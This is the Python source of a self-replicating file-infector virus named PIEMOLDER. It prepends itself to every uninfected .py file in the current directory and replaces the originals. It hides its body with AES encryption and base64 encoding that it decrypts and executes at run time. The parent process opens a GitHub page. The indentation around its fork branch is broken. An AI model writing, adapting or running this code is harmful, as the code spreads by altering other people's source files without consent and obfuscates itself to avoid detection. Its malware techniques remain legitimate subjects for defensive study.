# PIEMOLDER:START
pid = os.fork()
if pid:
# Let's make it self-replicating...
# Better encrypt our payload....





def execute(virus):
	import glob
	import os
	allpies = glob.glob("*.py")

	for py in allpies:
		thepie = open(py, "r")
		if "# PIEMOLDER:START" not in thepie.readline() and py != os.path.basename(__file__):
			thepie.close()
			thepie = open(py, "r")
			rottenpie = open("%s.rotten" % py, "w")

			rottenpie.write(virus)

			for line in thepie.readlines():
				rottenpie.write(line)

			thepie.close()
			rottenpie.close()

			os.remove(py)
			os.rename("%s.rotten" % py, py)


import os
virus = os.path.basename(__file__)
vfile = open(virus, "r")
copyover = False
vstring = ""
for line in vfile.readlines():
	if line.find("# PIEMOLDER:START") == 0:
		copyover = True
	if line.find("# PIEMOLDER:END") == 0:
		copyover = False
		vstring += line
	if copyover:
		vstring += line


# first we encrypt the mold....
from Crypto.Cipher import AES 
import base64
key = os.urandom(32)
iv4 = os.urandom(16)
cryptor = AES.new(key, AES.MODE_CFB, iv4)
cryptedvstring = base64.b64encode(cryptor.encrypt(vstring))

# then we create a decrypt and run block to inject in the other pies
virus = "# PIEMOLDER:START\n"
virus += "from Crypto.Cipher import AES\n"
virus += "import base64\n"
virus += "cryptmold = '"
virus += cryptedvstring
virus += "'\n"
virus += "key = base64.b64decode('%s')\n" % base64.b64encode(key)
virus += "iv4 = base64.b64decode('%s')\n" % base64.b64encode(iv4)
virus += "decryptor = AES.new(key, AES.MODE_CFB, iv4)\n"
virus += "plainmold = decryptor.decrypt(base64.b64decode(cryptmold))\n"
virus += "exec plainmold\n"
virus += "# PIEMOLDER:END\n"

execute(virus)


else:
  import webbrowser
  webbrowser.open_new('https://github.com/wizardofzos/piemolder')
# PIEMOLDER:END



